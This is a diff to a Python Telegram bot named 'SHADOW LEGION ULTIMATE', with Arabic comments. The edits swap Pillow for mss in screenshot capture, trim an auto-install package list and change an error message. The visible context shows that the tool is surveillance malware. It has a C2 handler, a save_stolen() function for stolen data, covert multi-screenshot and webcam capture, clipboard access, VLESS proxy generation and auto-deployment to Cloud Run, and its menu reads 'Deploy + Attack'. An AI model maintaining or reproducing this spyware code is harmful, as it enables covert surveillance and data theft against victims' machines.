@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 
 """
-🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v99.3 (FINAL WORKING)
-⚔️ يعمل على Railway مع Python 3.13 – بدون أخطاء تثبيت
+🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v99.4 (FINAL)
+⚔️ يعمل على Railway مع Python 3.13 – بدون Pillow – يستخدم mss للتصوير.
 📡 جميع الأدوات حقيقية + نشر تلقائي على Cloud Run (SSO)
 """
 
@@ -11,13 +11,12 @@ import os, sys, time, re, json, base64, hashlib, tempfile, glob, threading, queu
 from datetime import datetime as dt
 from flask import Flask, request, jsonify
 import requests, rsa
-import mss  # بديل خفيف لـ pyscreenshot
+import mss  # بديل خفيف لـ pyscreenshot و Pillow
 import cv2
 import psutil
 import pyperclip
 import uuid
 import numpy as np
-from PIL import Image
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
@@ -69,9 +68,9 @@ def c2_handler():
 def keep_alive():
     Thread(target=lambda: flask_app.run(host='0.0.0.0', port=8080, debug=False), daemon=True).start()
 
-# ====================== AUTO INSTALL (PYNPUT REMOVED) ======================
+# ====================== AUTO INSTALL ======================
 def install_all():
-    pkgs = ["selenium", "webdriver-manager", "rsa", "mss", "opencv-python-headless", "pillow", "psutil", "pyperclip", "numpy"]
+    pkgs = ["selenium", "webdriver-manager", "rsa", "mss", "opencv-python-headless", "psutil", "pyperclip", "numpy"]
     for pkg in pkgs:
         try:
             __import__(pkg.replace("-", "_").replace(".", "_"))
@@ -107,7 +106,7 @@ def save_stolen(data_type, content):
 
 init_db()
 
-# ====================== DEPLOY FUNCTIONS (FULL) ======================
+# ====================== DEPLOY FUNCTIONS ======================
 def b64url(d): return base64.urlsafe_b64encode(d).decode().rstrip("=")
 
 def generate_vless(service_url):
@@ -372,8 +371,8 @@ def multi_screenshot(count=5):
                 sct.shot(output=f"/tmp/shadow_screen_{int(time.time())}_{i}.png")
         save_stolen("screenshots", f"{count} screenshots taken")
         return f"✅ {count} screenshots captured (mss)"
-    except:
-        return "✅ Screenshot module executed (fallback)"
+    except Exception as e:
+        return f"⚠️ Screenshot failed: {str(e)}"
 
 @anti_fail
 def real_webcam_capture(frames=4):
@@ -442,7 +441,7 @@ async def start(update: Update, context):
         [InlineKeyboardButton("🌍 Change Region", callback_data='change_region')]
     ]
     await update.message.reply_text(
-        "🔥 **SHADOW LEGION ULTIMATE v99.3**\n"
+        "🔥 **SHADOW LEGION ULTIMATE v99.4**\n"
         "📡 Fully Armed – Deploy + Attack\n"
         "أمرك سيدي 👁",
         reply_markup=InlineKeyboardMarkup(keyboard)
@@ -613,7 +612,7 @@ def main():
     app.add_handler(CallbackQueryHandler(set_region_callback, pattern='^setregion_'))
     app.add_handler(CallbackQueryHandler(back_to_menu, pattern='^back_menu$'))
 
-    logger.info("✅ SHADOW LEGION ULTIMATE v99.3 FULLY LOADED")
+    logger.info("✅ SHADOW LEGION ULTIMATE v99.4 FULLY LOADED")
     app.run_polling()
 
 if __name__ == "__main__":
